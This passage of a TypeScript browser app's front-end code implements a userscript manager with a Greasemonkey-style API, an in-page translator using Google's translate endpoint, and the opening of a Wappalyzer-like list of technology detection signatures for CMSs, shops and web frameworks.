    const m = line.match(/^\s*\/\/\s*@(\S+)\s*(.*)$/);
    if (!m) continue;
    const key = m[1].toLowerCase();
    const val = (m[2] || "").trim();
    if (key === "name" && val) meta.name = val;
    else if (key === "match" || key === "include") meta.matches.push(val);
    else if (key === "exclude" || key === "exclude-match")
      meta.excludes.push(val);
    else if (key === "run-at") {
      const v = val.toLowerCase();
      if (
        v === "document-start" ||
        v === "document-end" ||
        v === "document-idle"
      )
        meta.runAt = v;
    } else if (key === "grant") meta.grants.push(val);
    else if (key === "noframes") meta.noFrames = true;
  }
  return meta;
}

/** Greasemonkey @match / @include パターンを RegExp に変換 */
function userScriptPatternToRegex(pattern: string): RegExp | null {
  if (!pattern) return null;
  if (pattern === "<all_urls>" || pattern === "*") return /^https?:\/\//i;
  // 正規表現リテラル形式 /.../flags
  const reLit = pattern.match(/^\/(.+)\/([a-z]*)$/);
  if (reLit) {
    try {
      return new RegExp(reLit[1], reLit[2]);
    } catch {
      return null;
    }
  }
  // glob 風 → regex
  const escaped = pattern
    .replace(/[.+^${}()|[\]\\]/g, "\\$&")
    .replace(/\*/g, ".*")
    .replace(/\?/g, ".");
  try {
    return new RegExp("^" + escaped + "$");
  } catch {
    return null;
  }
}

function urlMatchesUserScript(meta: UserScriptMeta, url: string): boolean {
  if (meta.matches.length === 0) return false;
  const matched = meta.matches.some((p) => {
    const r = userScriptPatternToRegex(p);
    return !!r && r.test(url);
  });
  if (!matched) return false;
  const excluded = meta.excludes.some((p) => {
    const r = userScriptPatternToRegex(p);
    return !!r && r.test(url);
  });
  return !excluded;
}

/** スクリプトを GM ラッパーで包んでページに注入する文字列を作る */
function buildUserScriptPayload(s: UserScript, meta: UserScriptMeta): string {
  const valueKey = US_GM_VALUES_PREFIX + s.id;
  const payload = {
    id: s.id,
    name: meta.name || s.name,
    source: s.source,
    grants: meta.grants,
    valueKey,
  };
  // ページ側に注入する関数本体 (IIFE)
  // 文字列リテラル化に注意: ユーザーソースは JSON.stringify で安全に渡す
  const fn = `(function(){
    try {
      var __cfg = ${JSON.stringify(payload)};
      // GM 値ストレージは window 内のメモリのみ (永続化は postMessage で UI 側に依頼するのが理想だが省略)
      var __gmValues = {};
      try {
        var raw = sessionStorage.getItem(__cfg.valueKey);
        if (raw) __gmValues = JSON.parse(raw);
      } catch(e){}
      function persist(){
        try { sessionStorage.setItem(__cfg.valueKey, JSON.stringify(__gmValues)); } catch(e){}
      }
      var GM_setValue = function(k, v){ __gmValues[k] = v; persist(); };
      var GM_getValue = function(k, d){ return Object.prototype.hasOwnProperty.call(__gmValues,k) ? __gmValues[k] : d; };
      var GM_deleteValue = function(k){ delete __gmValues[k]; persist(); };
      var GM_listValues = function(){ return Object.keys(__gmValues); };
      var GM_addStyle = function(css){
        var st = document.createElement('style');
        st.type = 'text/css';
        st.textContent = String(css);
        (document.head || document.documentElement).appendChild(st);
        return st;
      };
      var GM_setClipboard = function(text){
        try { navigator.clipboard.writeText(String(text)); } catch(e){}
      };
      var GM_openInTab = function(url){
        try { window.open(url, '_blank'); } catch(e){}
      };
      var GM_log = function(){ try { console.log.apply(console, ['[US:'+__cfg.name+']'].concat([].slice.call(arguments))); } catch(e){} };
      var GM_xmlhttpRequest = function(opts){
        opts = opts || {};
        var ctrl = new AbortController();
        var headers = opts.headers || {};
        fetch(opts.url, {
          method: opts.method || 'GET',
          headers: headers,
          body: opts.data,
          credentials: opts.anonymous ? 'omit' : 'include',
          signal: ctrl.signal
        }).then(function(r){
          return r.text().then(function(t){
            var resp = {
              status: r.status,
              statusText: r.statusText,
              responseText: t,
              response: t,
              responseHeaders: ''
            };
            r.headers.forEach(function(v,k){ resp.responseHeaders += k+': '+v+'\\r\\n'; });
            if (opts.onload) opts.onload(resp);
          });
        }).catch(function(e){
          if (opts.onerror) opts.onerror({error: String(e)});
        });
        return { abort: function(){ ctrl.abort(); } };
      };
      var GM_registerMenuCommand = function(name, fn){ /* no-op */ };
      var GM_info = {
        script: { name: __cfg.name, grant: __cfg.grants, version: '1.0' },
        scriptHandler: 'yuzu-browser', version: '1.0'
      };
      var GM = {
        setValue: function(k,v){ return new Promise(function(res){ GM_setValue(k,v); res(); }); },
        getValue: function(k,d){ return Promise.resolve(GM_getValue(k,d)); },
        deleteValue: function(k){ return new Promise(function(res){ GM_deleteValue(k); res(); }); },
        listValues: function(){ return Promise.resolve(GM_listValues()); },
        addStyle: function(css){ return Promise.resolve(GM_addStyle(css)); },
        setClipboard: function(t){ return Promise.resolve(GM_setClipboard(t)); },
        openInTab: function(u){ return Promise.resolve(GM_openInTab(u)); },
        xmlHttpRequest: GM_xmlhttpRequest,
        info: GM_info
      };
      var unsafeWindow = window;
      // 実行
      (function(){
        try {
          eval(__cfg.source);
        } catch(e) {
          console.error('[yuzu UserScript:'+__cfg.name+']', e);
        }
      })();
    } catch(err) {
      console.error('[yuzu UserScript wrapper error]', err);
    }
  })();`;
  return fn;
}

function generateScriptId(): string {
  return (
    "us-" +
    Date.now().toString(36) +
    "-" +
    Math.random().toString(36).slice(2, 8)
  );
}

const DEFAULT_USERSCRIPT_TEMPLATE = `// ==UserScript==
// @name         New Script
// @match        *://*/*
// @run-at       document-end
// @grant        none
// ==/UserScript==

(function() {
  'use strict';
  console.log('Hello from yuzu UserScript!');
})();`;

/** ユーザースクリプトを指定タブに注入 */
async function injectUserScriptsForTab(
  tabId: number,
  url: string,
): Promise<void> {
  if (!isUserScriptsEnabled()) return;
  if (!/^https?:\/\//i.test(url)) return;
  let injected = 0;
  for (const s of userScripts) {
    if (!s.enabled) continue;
    const meta = parseUserScriptMeta(s.source);
    if (!urlMatchesUserScript(meta, url)) continue;
    const payload = buildUserScriptPayload(s, meta);
    // run-at による遅延 (document-start は即時、end は ~600ms、idle は ~1500ms)
    const delay =
      meta.runAt === "document-start"
        ? 0
        : meta.runAt === "document-end"
          ? 600
          : 1500;
    setTimeout(() => {
      void invoke("tab_eval_script", { id: tabId, script: payload }).catch(
        (e) => {
          appendUserScriptLog(
            `[${meta.name || s.name}] inject failed: ${String(e)}`,
          );
        },
      );
    }, delay);
    injected++;
  }
  if (injected > 0) {
    appendUserScriptLog(`▶ ${url} に ${injected} 個のスクリプトを注入予定`);
  }
}

function appendUserScriptLog(line: string): void {
  const log = document.getElementById("us-log") as HTMLPreElement | null;
  if (!log) return;
  const ts = new Date().toLocaleTimeString();
  log.textContent = `[${ts}] ${line}\n` + (log.textContent || "");
  // ログは最大 200 行に制限
  const lines = (log.textContent || "").split("\n");
  if (lines.length > 200) log.textContent = lines.slice(0, 200).join("\n");
}

function renderUserScriptList(): void {
  const list = document.getElementById("us-list") as HTMLUListElement | null;
  const empty = document.getElementById("us-empty") as HTMLDivElement | null;
  if (!list || !empty) return;
  list.innerHTML = "";
  if (userScripts.length === 0) {
    empty.hidden = false;
    return;
  }
  empty.hidden = true;
  for (const s of userScripts) {
    const meta = parseUserScriptMeta(s.source);
    const li = document.createElement("li");
    li.style.cssText =
      "padding:6px 8px;cursor:pointer;border-bottom:1px solid #2c2c2c;display:flex;align-items:center;gap:6px;color:#ddd;" +
      (s.id === usSelectedId ? "background:#2a3a55;" : "");
    const cb = document.createElement("input");
    cb.type = "checkbox";
    cb.checked = s.enabled;
    cb.title = "有効/無効";
    cb.addEventListener("click", (e) => e.stopPropagation());
    cb.addEventListener("change", () => {
      s.enabled = cb.checked;
      saveUserScripts();
    });
    li.appendChild(cb);
    const span = document.createElement("span");
    span.style.cssText =
      "flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;font-size:13px;";
    span.textContent = meta.name || s.name || "(無名)";
    span.title = `${meta.name || s.name}\n${meta.matches.join("\n")}`;
    li.appendChild(span);
    li.addEventListener("click", () => {
      usSelectedId = s.id;
      loadSelectedToEditor();
      renderUserScriptList();
    });
    list.appendChild(li);
  }
}

function loadSelectedToEditor(): void {
  const nameEl = document.getElementById("us-name") as HTMLInputElement | null;
  const srcEl = document.getElementById(
    "us-source",
  ) as HTMLTextAreaElement | null;
  const enEl = document.getElementById("us-enabled") as HTMLInputElement | null;
  if (!nameEl || !srcEl || !enEl) return;
  const s = userScripts.find((x) => x.id === usSelectedId);
  if (!s) {
    nameEl.value = "";
    srcEl.value = "";
    enEl.checked = true;
    return;
  }
  nameEl.value = s.name;
  srcEl.value = s.source;
  enEl.checked = s.enabled;
}

function saveCurrentEditor(): boolean {
  const nameEl = document.getElementById("us-name") as HTMLInputElement | null;
  const srcEl = document.getElementById(
    "us-source",
  ) as HTMLTextAreaElement | null;
  const enEl = document.getElementById("us-enabled") as HTMLInputElement | null;
  const statusEl = document.getElementById(
    "us-status",
  ) as HTMLSpanElement | null;
  if (!nameEl || !srcEl || !enEl) return false;
  const source = srcEl.value;
  const meta = parseUserScriptMeta(source);
  const name = (nameEl.value.trim() || meta.name || "(無名)").trim();
  if (!source.trim()) {
    if (statusEl) statusEl.textContent = "ソースが空です";
    return false;
  }
  let s = userScripts.find((x) => x.id === usSelectedId);
  if (!s) {
    s = {
      id: generateScriptId(),
      name,
      source,
      enabled: enEl.checked,
      updatedAt: Date.now(),
    };
    userScripts.push(s);
    usSelectedId = s.id;
  } else {
    s.name = name;
    s.source = source;
    s.enabled = enEl.checked;
    s.updatedAt = Date.now();
  }
  saveUserScripts();
  renderUserScriptList();
  if (statusEl) {
    statusEl.textContent = `保存: ${name} (@match: ${meta.matches.length}件, ${meta.runAt})`;
  }
  return true;
}

function setupUserScriptTool(): void {
  userScripts = loadUserScripts();
  const newBtn = document.getElementById("us-new") as HTMLButtonElement | null;
  const importBtn = document.getElementById(
    "us-import",
  ) as HTMLButtonElement | null;
  const importUrlBtn = document.getElementById(
    "us-import-url",
  ) as HTMLButtonElement | null;
  const runNowBtn = document.getElementById(
    "us-run-now",
  ) as HTMLButtonElement | null;
  const masterEl = document.getElementById(
    "us-master-enabled",
  ) as HTMLInputElement | null;
  const saveBtn = document.getElementById(
    "us-save",
  ) as HTMLButtonElement | null;
  const delBtn = document.getElementById(
    "us-delete",
  ) as HTMLButtonElement | null;
  const exportBtn = document.getElementById(
    "us-export",
  ) as HTMLButtonElement | null;
  const dupBtn = document.getElementById(
    "us-duplicate",
  ) as HTMLButtonElement | null;
  const srcEl = document.getElementById(
    "us-source",
  ) as HTMLTextAreaElement | null;
  const statusEl = document.getElementById(
    "us-status",
  ) as HTMLSpanElement | null;
  if (!newBtn || !srcEl) return;

  if (masterEl) masterEl.checked = isUserScriptsEnabled();
  masterEl?.addEventListener("change", () => {
    setUserScriptsEnabled(!!masterEl.checked);
    appendUserScriptLog(`全体スイッチ: ${masterEl.checked ? "有効" : "無効"}`);
  });

  newBtn.addEventListener("click", () => {
    usSelectedId = null;
    const nameEl = document.getElementById(
      "us-name",
    ) as HTMLInputElement | null;
    const enEl = document.getElementById(
      "us-enabled",
    ) as HTMLInputElement | null;
    if (nameEl) nameEl.value = "New Script";
    if (enEl) enEl.checked = true;
    srcEl.value = DEFAULT_USERSCRIPT_TEMPLATE;
    renderUserScriptList();
    srcEl.focus();
  });

  saveBtn?.addEventListener("click", () => {
    saveCurrentEditor();
  });

  delBtn?.addEventListener("click", () => {
    if (!usSelectedId) return;
    const s = userScripts.find((x) => x.id === usSelectedId);
    if (!s) return;
    if (!confirm(`「${s.name}」を削除しますか?`)) return;
    userScripts = userScripts.filter((x) => x.id !== usSelectedId);
    usSelectedId = null;
    saveUserScripts();
    renderUserScriptList();
    loadSelectedToEditor();
    if (statusEl) statusEl.textContent = "削除しました";
  });

  exportBtn?.addEventListener("click", () => {
    const s = userScripts.find((x) => x.id === usSelectedId);
    if (!s) {
      if (statusEl) statusEl.textContent = "選択されていません";
      return;
    }
    const blob = new Blob([s.source], {
      type: "application/javascript;charset=utf-8",
    });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    const safe = s.name.replace(/[^\w\-]+/g, "_") || "script";
    a.download = `${safe}.user.js`;
    document.body.appendChild(a);
    a.click();
    a.remove();
    setTimeout(() => URL.revokeObjectURL(url), 1000);
  });

  dupBtn?.addEventListener("click", () => {
    const s = userScripts.find((x) => x.id === usSelectedId);
    if (!s) return;
    const copy: UserScript = {
      id: generateScriptId(),
      name: s.name + " (copy)",
      source: s.source,
      enabled: false,
      updatedAt: Date.now(),
    };
    userScripts.push(copy);
    usSelectedId = copy.id;
    saveUserScripts();
    renderUserScriptList();
    loadSelectedToEditor();
  });

  importBtn?.addEventListener("click", () => {
    const inp = document.createElement("input");
    inp.type = "file";
    inp.accept = ".js,.user.js,text/javascript";
    inp.onchange = async (): Promise<void> => {
      const f = inp.files?.[0];
      if (!f) return;
      const text = await f.text();
      const meta = parseUserScriptMeta(text);
      const s: UserScript = {
        id: generateScriptId(),
        name: meta.name || f.name.replace(/\.user\.js$|\.js$/, ""),
        source: text,
        enabled: true,
        updatedAt: Date.now(),
      };
      userScripts.push(s);
      usSelectedId = s.id;
      saveUserScripts();
      renderUserScriptList();
      loadSelectedToEditor();
      if (statusEl) statusEl.textContent = `インポート: ${s.name}`;
    };
    inp.click();
  });

  importUrlBtn?.addEventListener("click", async () => {
    const url = prompt("UserScript の URL を入力 (.user.js)");
    if (!url) return;
    try {
      if (statusEl) statusEl.textContent = "取得中…";
      const r = await invoke<ScrapeResult>("toolbox_scrape_fetch", {
        url,
        userAgent: null,
      });
      const text = r.body;
      const meta = parseUserScriptMeta(text);
      const s: UserScript = {
        id: generateScriptId(),
        name: meta.name || url.split("/").pop() || "script",
        source: text,
        enabled: true,
        updatedAt: Date.now(),
      };
      userScripts.push(s);
      usSelectedId = s.id;
      saveUserScripts();
      renderUserScriptList();
      loadSelectedToEditor();
      if (statusEl) statusEl.textContent = `インポート: ${s.name}`;
    } catch (e) {
      if (statusEl) statusEl.textContent = `エラー: ${String(e)}`;
    }
  });

  runNowBtn?.addEventListener("click", () => {
    const a = activeTab();
    if (!a) {
      if (statusEl) statusEl.textContent = "アクティブなタブがありません";
      return;
    }
    const s = userScripts.find((x) => x.id === usSelectedId);
    if (s) {
      // 選択中のものを (パターン無視で) 強制実行
      const meta = parseUserScriptMeta(s.source);
      const payload = buildUserScriptPayload(s, meta);
      void invoke("tab_eval_script", { id: a.id, script: payload })
        .then(() => {
          if (statusEl) statusEl.textContent = `▶ 実行: ${meta.name || s.name}`;
        })
        .catch((e) => {
          if (statusEl) statusEl.textContent = `エラー: ${String(e)}`;
        });
    } else {
      // 何も選択していない場合は通常の URL マッチ実行
      void injectUserScriptsForTab(a.id, a.url);
      if (statusEl) statusEl.textContent = "URL マッチで再実行";
    }
  });

  // Ctrl+S で保存
  srcEl.addEventListener("keydown", (e) => {
    if (e.ctrlKey && e.key.toLowerCase() === "s") {
      e.preventDefault();
      saveCurrentEditor();
    }
  });

  renderUserScriptList();
  loadSelectedToEditor();
}

// ===== 🌐 ページ翻訳 (Google translate gtx 無料エンドポイント) =====

const TRANSLATE_LANG_KEY = "yuzu-translate-lang-v1";

function setupPageTranslate(): void {
  const sel = document.getElementById(
    "translate-lang",
  ) as HTMLSelectElement | null;
  if (!sel) return;

  // 「原文」(空) で初期化。言語設定の保存は復元しない (ページごとに選択し直す)。
  sel.value = "";

  function apply(mode: "translate" | "restore", target: string): void {
    const a = activeTab();
    if (!a) return;
    const script = buildTranslatePayload(target || "ja", mode);
    void invoke("tab_eval_script", { id: a.id, script }).catch((e) => {
      console.error("translate inject failed:", e);
    });
  }

  sel.addEventListener("change", () => {
    const v = sel.value;
    if (!v) {
      // 「原文」選択時は復元
      apply("restore", "");
    } else {
      // 既に翻訳済みの可能性があるので一旦復元してから翻訳
      apply("restore", "");
      setTimeout(() => apply("translate", v), 100);
    }
    localStorage.setItem(TRANSLATE_LANG_KEY, v);
  });
}

/** ページ内に注入する自己完結スクリプト */
function buildTranslatePayload(
  target: string,
  mode: "translate" | "restore" = "translate",
): string {
  return `(function(){
  try {
    var TARGET = ${JSON.stringify(target)};
    var MODE = ${JSON.stringify(mode)};
    var W = window;
    // 復元
    if (MODE === 'restore') {
      if (W.__yuzuTranslateState && W.__yuzuTranslateState.active) {
        var st = W.__yuzuTranslateState;
        st.entries.forEach(function(e){
          try { e.node.nodeValue = e.original; } catch(_) {}
        });
        st.active = false;
      }
      try {
        var b0 = document.getElementById('__yuzu_translate_banner');
        if (b0) b0.remove();
      } catch(_) {}
      return;
    }
    // 翻訳モード: 既に翻訳済みなら何もしない
    if (W.__yuzuTranslateState && W.__yuzuTranslateState.active) {
      return;
    }
    // バナー
    var banner = document.createElement('div');
    banner.id = '__yuzu_translate_banner';
    banner.textContent = '🌐 翻訳中... (' + TARGET + ')';
    banner.style.cssText = 'position:fixed;top:8px;right:8px;z-index:2147483647;background:#1f6feb;color:#fff;padding:6px 12px;border-radius:6px;font:13px/1.4 system-ui,sans-serif;box-shadow:0 2px 8px rgba(0,0,0,0.3);';
    document.documentElement.appendChild(banner);

    // テキストノード収集
    var SKIP_TAGS = {SCRIPT:1,STYLE:1,NOSCRIPT:1,CODE:1,PRE:1,TEXTAREA:1,KBD:1,SAMP:1,VAR:1};
    var entries = [];
    var walker = document.createTreeWalker(document.body || document.documentElement, NodeFilter.SHOW_TEXT, {
      acceptNode: function(n){
        if (!n.nodeValue) return NodeFilter.FILTER_REJECT;
        var t = n.nodeValue.replace(/\\s+/g,'').trim();
        if (!t) return NodeFilter.FILTER_REJECT;
        if (t.length < 2) return NodeFilter.FILTER_REJECT;
        var p = n.parentElement;
        while (p) {
          if (SKIP_TAGS[p.tagName]) return NodeFilter.FILTER_REJECT;
          if (p.isContentEditable) return NodeFilter.FILTER_REJECT;
          p = p.parentElement;
        }
        return NodeFilter.FILTER_ACCEPT;
      }
    });
    var node;
    while ((node = walker.nextNode())) {
      entries.push({ node: node, original: node.nodeValue });
    }
    if (entries.length === 0) {
      banner.textContent = '🌐 翻訳対象なし';
      setTimeout(function(){ try{ banner.remove(); }catch(_){} }, 1500);
      return;
    }

    W.__yuzuTranslateState = { active: true, entries: entries };

    // バッチング: 1リクエスト 4000 文字目安、区切り \\n\\n___YZ___\\n\\n
    var SEP = '\\n\\n___YZ___\\n\\n';
    var batches = [];
    var cur = [];
    var curLen = 0;
    for (var i = 0; i < entries.length; i++) {
      var t = entries[i].original;
      if (curLen + t.length > 3500 && cur.length > 0) {
        batches.push(cur);
        cur = [];
        curLen = 0;
      }
      cur.push(i);
      curLen += t.length + SEP.length;
    }
    if (cur.length) batches.push(cur);

    var done = 0;
    var total = batches.length;
    function update(){
      banner.textContent = '🌐 翻訳中... ' + done + '/' + total;
    }
    update();

    function translateBatch(idxs){
      var srcText = idxs.map(function(i){ return entries[i].original; }).join(SEP);
      var url = 'https://translate.googleapis.com/translate_a/single?client=gtx&sl=auto&tl=' + encodeURIComponent(TARGET) + '&dt=t&q=' + encodeURIComponent(srcText);
      return fetch(url, { credentials: 'omit' })
        .then(function(r){ return r.json(); })
        .then(function(data){
          // data[0] は [translated, original, ...][]
          var combined = '';
          if (data && data[0]) {
            for (var k = 0; k < data[0].length; k++) {
              var seg = data[0][k];
              if (seg && seg[0]) combined += seg[0];
            }
          }
          var parts = combined.split(SEP);
          // 区切りが翻訳で崩れる場合のフォールバック: 個別リクエスト
          if (parts.length !== idxs.length) {
            return Promise.all(idxs.map(function(i){
              var u = 'https://translate.googleapis.com/translate_a/single?client=gtx&sl=auto&tl=' + encodeURIComponent(TARGET) + '&dt=t&q=' + encodeURIComponent(entries[i].original);
              return fetch(u, { credentials: 'omit' }).then(function(r){ return r.json(); }).then(function(d){
                var t = '';
                if (d && d[0]) for (var x=0;x<d[0].length;x++) if (d[0][x] && d[0][x][0]) t += d[0][x][0];
                try { entries[i].node.nodeValue = t || entries[i].original; } catch(_){}
              }).catch(function(){});
            }));
          }
          for (var j = 0; j < idxs.length; j++) {
            try { entries[idxs[j]].node.nodeValue = parts[j]; } catch(_){}
          }
        })
        .catch(function(e){ console.warn('[yuzu translate]', e); })
        .then(function(){ done++; update(); });
    }

    // 並列度 3
    var queue = batches.slice();
    function worker(){
      if (queue.length === 0) return Promise.resolve();
      return translateBatch(queue.shift()).then(worker);
    }
    Promise.all([worker(), worker(), worker()]).then(function(){
      banner.textContent = '🌐 翻訳完了 (もう一度クリックで元に戻す)';
      banner.style.background = '#2da44e';
      setTimeout(function(){ try{ banner.remove(); }catch(_){} }, 2500);
    });
  } catch(err) {
    console.error('[yuzu translate]', err);
  }
})();`;
}

// ===== 🔬 技術プロファイラ (Wappalyzer 風) =====
// 検出ソース: HTML 本文・script/link URL・<meta>・レスポンスヘッダ・Cookie 名・
// JSON-LD・グローバル変数 (現タブ DOM 経由)。
// Wappalyzer 公式に近づけつつ日本のサービスも厚めにカバー。

interface TechMetaRule {
  name: string;
  pattern: RegExp;
}
interface TechHeaderRule {
  name: string; // 小文字
  pattern: RegExp;
}
interface TechSignature {
  name: string;
  category: string;
  icon?: string;
  /** HTML 本文 (先頭 200KB) に対する正規表現。 */
  html?: RegExp[];
  /** <script src> / <link href> / <iframe src> の URL に対する正規表現。 */
  url?: RegExp[];
  /** <meta name="..."> の content に対する正規表現。 */
  meta?: TechMetaRule[];
  /** レスポンスヘッダ (key 小文字) の値に対する正規表現。 */
  headers?: TechHeaderRule[];
  /** Set-Cookie の name に対する正規表現。 */
  cookies?: RegExp[];
  /** Content-Type に対する正規表現。 */
  contentType?: RegExp[];
  /** window グローバル変数名 (DOM 経由で取得した場合のみ評価)。 */
  global?: string[];
  /** 推定バージョンを抽出するための補助正規表現 (キャプチャ 1)。 */
  version?: RegExp[];
}

const TECH_SIGNATURES: TechSignature[] = [
  // ============================================================
  // CMS
  // ============================================================
  {
    name: "WordPress",
    category: "CMS",
    icon: "📝",
    html: [/wp-content\//i, /wp-includes\//i, /wp-json\//i],
    meta: [{ name: "generator", pattern: /WordPress\s*([\d.]+)?/i }],
    headers: [{ name: "x-powered-by", pattern: /WordPress/i }],
    cookies: [/^wordpress_/i, /^wp-settings-/i],
    version: [/WordPress\s*([\d.]+)/i],
  },
  {
    name: "Drupal",
    category: "CMS",
    icon: "📝",
    html: [/sites\/default\/files/i, /Drupal\.settings/i, /\/drupal\.js/i],
    meta: [{ name: "generator", pattern: /Drupal\s*([\d.]+)?/i }],
    headers: [
      { name: "x-drupal-cache", pattern: /./i },
      { name: "x-generator", pattern: /Drupal/i },
    ],
  },
  {
    name: "Joomla",
    category: "CMS",
    icon: "📝",
    html: [/\/components\/com_/i, /Joomla!/i],
    meta: [{ name: "generator", pattern: /Joomla/i }],
  },
  {
    name: "Ghost",
    category: "CMS",
    icon: "👻",
    html: [/ghost\.io/i, /content\/themes/i],
    meta: [{ name: "generator", pattern: /Ghost\s*([\d.]+)?/i }],
  },
  {
    name: "MovableType",
    category: "CMS",
    icon: "📝",
    meta: [{ name: "generator", pattern: /Movable Type/i }],
  },
  {
    name: "TYPO3",
    category: "CMS",
    icon: "📝",
    meta: [{ name: "generator", pattern: /TYPO3/i }],
    html: [/typo3conf\//i, /typo3temp\//i],
  },
  {
    name: "Sitecore",
    category: "CMS",
    icon: "📝",
    cookies: [/^sc_/i, /^SC_ANALYTICS/i],
  },
  {
    name: "Adobe Experience Manager",
    category: "CMS",
    icon: "📝",
    html: [/etc\.clientlibs/i, /\/etc\/designs\//i, /aem-/i],
  },
  {
    name: "HubSpot CMS",
    category: "CMS",
    icon: "📝",
    html: [/hs-scripts\.com|js\.hs-analytics\.net|hs-banner\.com/i],
  },
  {
    name: "Webflow",
    category: "CMS",
    icon: "🌊",
    html: [/webflow\.css|webflow\.js/i],
    meta: [{ name: "generator", pattern: /Webflow/i }],
  },
  {
    name: "Squarespace",
    category: "CMS",
    icon: "🟪",
    html: [/static1\.squarespace\.com|squarespace-cdn\.com/i],
  },
  {
    name: "Wix",
    category: "CMS",
    icon: "🟦",
    html: [/static\.wixstatic\.com|_wix\b/i],
    meta: [{ name: "generator", pattern: /Wix/i }],
  },
  {
    name: "Contentful",
    category: "CMS (Headless)",
    icon: "📦",
    html: [/images\.ctfassets\.net|cdn\.contentful\.com/i],
  },
  {
    name: "Strapi",
    category: "CMS (Headless)",
    icon: "🛡️",
    headers: [{ name: "x-powered-by", pattern: /Strapi/i }],
  },
  {
    name: "Sanity",
    category: "CMS (Headless)",
    icon: "🌈",
    html: [/cdn\.sanity\.io/i],
  },

  // ============================================================
  // EC / 決済
  // ============================================================
  {
    name: "Shopify",
    category: "EC",
    icon: "🛒",
    html: [/cdn\.shopify\.com|Shopify\.theme|shopify-section/i],
    headers: [
      { name: "x-shopid", pattern: /./ },
      { name: "x-shopify-stage", pattern: /./ },
    ],
    cookies: [/^_shopify/i, /^_secure_session_id/i],
  },
  {
    name: "WooCommerce",
    category: "EC",
    icon: "🛒",
    html: [/woocommerce|wc-ajax/i],
    cookies: [/^woocommerce_/i, /^wc_/i],
  },
  {
    name: "Magento",
    category: "EC",
    icon: "🛒",
    html: [/Mage\.Cookies|skin\/frontend/i],
    cookies: [/^X-Magento-Vary/i, /^frontend/i],
  },
  {
    name: "BigCommerce",
    category: "EC",
    icon: "🛒",
    headers: [
      { name: "x-bc-apex", pattern: /./ },
      { name: "x-magento-cache-control", pattern: /./ },
    ],
    html: [/cdn\d+\.bigcommerce\.com/i],
  },
  {
    name: "PrestaShop",
    category: "EC",
    icon: "🛒",
    headers: [{ name: "powered-by", pattern: /PrestaShop/i }],
    meta: [{ name: "generator", pattern: /PrestaShop/i }],
  },
  {
    name: "Salesforce Commerce Cloud",
    category: "EC",
    icon: "🛒",
    html: [/demandware\.static|demandware\.edgesuite\.net/i],
  },
  { name: "BASE", category: "EC", icon: "🛒", html: [/thebase\.in|base-cms/i] },
  {
    name: "STORES",
    category: "EC",
    icon: "🛒",
    html: [/stores\.jp|static\.stores\.jp/i],
  },
  { name: "Stripe", category: "決済", icon: "💳", url: [/js\.stripe\.com/i] },
  {
    name: "PayPal",
    category: "決済",
    icon: "💳",
    url: [/paypal\.com\/sdk\/js|paypalobjects\.com/i],
  },
  {
    name: "Square",
    category: "決済",
    icon: "💳",
    url: [/js\.squarecdn\.com|squareup\.com\/payments/i],
  },
  {
    name: "Amazon Pay",
    category: "決済",
    icon: "💳",
    url: [/static-na\.payments-amazon\.com|amazonpay/i],
  },

  // ============================================================
  // フレームワーク (フロントエンド)
  // ============================================================
  {
    name: "Next.js",
    category: "フレームワーク",
    icon: "▲",
    html: [/__NEXT_DATA__|_next\/static/i],
    meta: [{ name: "next-head-count", pattern: /./ }],
    global: ["__NEXT_DATA__", "next"],
  },
  {
    name: "Nuxt.js",
    category: "フレームワーク",
    icon: "💚",
    html: [/__NUXT__|_nuxt\//i],
    global: ["__NUXT__", "$nuxt"],
  },
  {
    name: "Gatsby",
    category: "フレームワーク",
    icon: "🟣",
    html: [/___gatsby|gatsby-/i],
    meta: [{ name: "generator", pattern: /Gatsby/i }],
  },
  {
    name: "Remix",
    category: "フレームワーク",
    icon: "🎵",
    html: [/__remixContext|__remixManifest/i],
    global: ["__remixContext"],
  },
  {
    name: "SvelteKit",
    category: "フレームワーク",
    icon: "🟧",
    html: [/__sveltekit_|\/_app\/immutable\//i],
  },
  {
    name: "Astro",
    category: "フレームワーク",
    icon: "🚀",
    html: [/astro-island|data-astro-/i],
    meta: [{ name: "generator", pattern: /Astro/i }],
  },
  {
    name: "Qwik",
    category: "フレームワーク",
    icon: "⚡",
    html: [/q:base|q:container|q:render/i],
  },
  {
    name: "Hugo",
    category: "静的サイトジェネレータ",
    icon: "📰",
    meta: [{ name: "generator", pattern: /Hugo/i }],
  },
  {
    name: "Jekyll",
    category: "静的サイトジェネレータ",
    icon: "📰",
    meta: [{ name: "generator", pattern: /Jekyll/i }],
  },
  {
    name: "Eleventy",
    category: "静的サイトジェネレータ",
    icon: "📰",
    meta: [{ name: "generator", pattern: /Eleventy/i }],
  },
  {
    name: "Docusaurus",
    category: "静的サイトジェネレータ",
    icon: "📰",
    meta: [{ name: "generator", pattern: /Docusaurus/i }],
  },
  {
    name: "VitePress / VuePress",
    category: "静的サイトジェネレータ",
    icon: "📰",
    html: [/vitepress|vuepress/i],
  },
  {
    name: "MkDocs",
    category: "静的サイトジェネレータ",
    icon: "📰",
    meta: [{ name: "generator", pattern: /MkDocs/i }],
  },

  // ============================================================
  // フレームワーク (サーバ)
  // ============================================================
  {
    name: "Express",
    category: "サーバ",
    icon: "🟩",
    headers: [{ name: "x-powered-by", pattern: /Express/i }],
  },
  {
    name: "Koa",
    category: "サーバ",
    icon: "🟩",
    headers: [{ name: "x-powered-by", pattern: /Koa/i }],
  },
  {
    name: "Hapi",
    category: "サーバ",
    icon: "🟩",
    headers: [{ name: "server", pattern: /hapi/i }],
  },
  {
    name: "NestJS",
    category: "サーバ",
    icon: "🐱",
    headers: [{ name: "x-powered-by", pattern: /NestJS/i }],
  },
  {
    name: "Fastify",
    category: "サーバ",
    icon: "⚡",
    headers: [{ name: "x-powered-by", pattern: /Fastify/i }],
  },
  {
    name: "PHP",
    category: "サーバ言語",
    icon: "🐘",
    headers: [
      { name: "x-powered-by", pattern: /PHP\/?([\d.]+)?/i },
      { name: "set-cookie", pattern: /PHPSESSID/i },
    ],
    cookies: [/^PHPSESSID$/i],
  },
  {
    name: "Ruby on Rails",
    category: "サーバ",
    icon: "💎",
    headers: [
      { name: "x-powered-by", pattern: /Ruby on Rails|Phusion Passenger/i },
      { name: "server", pattern: /Phusion Passenger/i },
    ],
    cookies: [/^_session_id$/i, /^_csrf_token$/i],
  },
  {
    name: "Django",
    category: "サーバ",
    icon: "🐍",
    cookies: [/^csrftoken$/i, /^django_language$/i, /^sessionid$/i],
  },
  {
    name: "Flask",
    category: "サーバ",
    icon: "🐍",
    cookies: [/^session$/i],
